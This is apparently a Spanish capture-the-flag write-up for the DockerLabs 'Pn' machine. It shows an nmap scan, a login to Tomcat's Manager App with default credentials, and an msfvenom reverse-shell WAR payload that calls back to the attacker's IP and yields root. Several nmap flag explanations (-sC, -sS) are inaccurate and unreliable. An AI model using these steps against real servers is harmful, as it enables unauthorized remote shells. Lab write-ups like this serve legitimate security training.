# -Pn
**Herramientas y recursos usados**
- nmap
- gobuster
- knock
- hydra

# Enumeración

Empezamos con un escaneo de los puertos.

`sudo nmap -p- --open -sC -sS -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN Los40ladrones`

- `-p-` : Todos los puertos
- `--open` : Todos los puertos abiertos
- `-sC` : Escaneo de todos los scripts
- `-sS` : Escaneo de todos los servicios
- `-sV` : Escaneo de todas las versiones de los servicios
- `--min-rate 5000` : Establece mínimo envío de paquetes mínimos 5000/s
- `-n` : No aplica resolución DNS
- `-Pn` : Omisión de detección de hosts
- `-vvv` : Verbose - Muestra toda la información

# Resultado escaneo

![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_1.jpg)   

Solo tenemos un puerto abierto, el 8080, donde podemos ver que está corriendo un Tomcat.  

![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_2.jpg)     

Podemos intentar acceder con las credenciales por defecto.    
Buscamos en Google cuáles suelen ser y probamos si alguna de ellas funciona.  

![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_3.jpg)    

¡Vemos que hay una combinación que sí funciona!    
Si intentamos acceder a través de Manager App y proporcionamos como usuario **tomcat** y como contraseña **s3cr3t**, ya podemos acceder.    

Ahora lo que haremos será crear un archivo .war malicioso con la herramienta **msfvenom**.    
Utilizaremos el comando:   

`sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=6969 -f war -o rev.war`  

![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_4.jpg)     

Una vez creado, lo subiremos a través del menú **WAR file to deploy**.  

![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_5.jpg)   

Por último, nos pondremos a la escucha en nuestra máquina atacante y abriremos el archivo que hemos cargado.  

![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_6.jpg)   

¡Y listo!   
¡Ya somos root!  

![Pn](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/pn/Pn_7.jpg) 



